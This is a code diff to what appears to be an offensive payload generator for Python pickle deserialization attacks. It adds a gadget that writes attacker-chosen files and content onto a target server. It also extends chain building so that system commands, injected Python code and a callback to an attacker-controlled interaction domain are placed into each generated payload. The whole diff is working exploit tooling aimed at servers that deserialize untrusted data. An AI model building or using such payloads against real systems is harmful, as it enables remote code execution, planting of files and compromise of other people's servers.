@@ -42,6 +42,16 @@ class PickleHttpGet:
     def __reduce__(self):
         return urllib.request.urlopen, (self.url,)
     
+class PickleFileWrite(PickleCode):
+
+    def __init__(self, args):
+        file = args[0:args.index(';')]
+        content = args[args.index(';')+1:]
+        super().__init__(f"""
+f = open("{file}", "w")
+f.write("{content}")
+f.close()""")
+    
 class Pickle(Serializer):
 
     gadgets = []
@@ -67,6 +77,11 @@ class Pickle(Serializer):
             'id': 'picklehttpget',
             'name': 'PickleHttpGet',
             'format': '<url>'
+        })
+        self.gadgets.append({
+            'id': 'picklefilewrite',
+            'name': 'PickleFileWrite',
+            'format': '<remote_file>;<content>'
         })
 
 
@@ -99,10 +114,14 @@ class Pickle(Serializer):
         system_command = self.chainOpts.system_command
         interact_domain = self.chainOpts.interact_domain
         py_code = self.getFileContentOrCode(self.chainOpts.python_code)
+        remote_file = self.chainOpts.remote_file
+        remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else py_code
     
         logging.info(f"System command: {system_command}")
         logging.info(f"Python Code: {py_code}")
         logging.info(f"Interact domain: {interact_domain}")
+        logging.info(f"File written on remote server: {remote_file}")
+        logging.info(f"Content written on server: {remote_content}")
 
         logging.info(f"Generating payloads...")
 
@@ -121,17 +140,26 @@ class Pickle(Serializer):
             chain_system_command = system_command
             chain_system_command = chain_system_command.replace('%chain_id%', chain['id'])
             chain_system_command = chain_system_command.replace('%domain%', str(interact_domain))
+            escaped_chain_system_command = chain_system_command.replace("'", "\\'")
 
             chain_py_code = py_code
-            chain_py_code = chain_py_code.replace('%system_command%', chain_system_command)
+            chain_py_code = chain_py_code.replace('%system_command%', escaped_chain_system_command)
             chain_py_code = chain_py_code.replace('%domain%', str(interact_domain))
             chain_py_code = chain_py_code.replace('%chain_id%', chain['id'])
+
+            chain_remote_content = remote_content
+            chain_remote_content = chain_remote_content.replace('%system_command%', escaped_chain_system_command)
+            chain_remote_content = chain_remote_content.replace('%domain%', str(interact_domain))
+            chain_remote_content = chain_remote_content.replace('%chain_id%', chain['id'])
 
             chainArguments = format
             chainArguments = chainArguments.replace('<system_command>', chain_system_command)
             chainArguments = chainArguments.replace('<code>', chain_py_code)
             chainArguments = chainArguments.replace('<domain>', str(interact_domain))
             chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/?{chain['id']}")
+            chainArguments = chainArguments.replace('<remote_file>', remote_file.replace('%ext%', 'py'))
+            chainArguments = chainArguments.replace('<content>', chain_remote_content)
+            
 
             payload = self.payload(chain['name'], chainArguments)
 
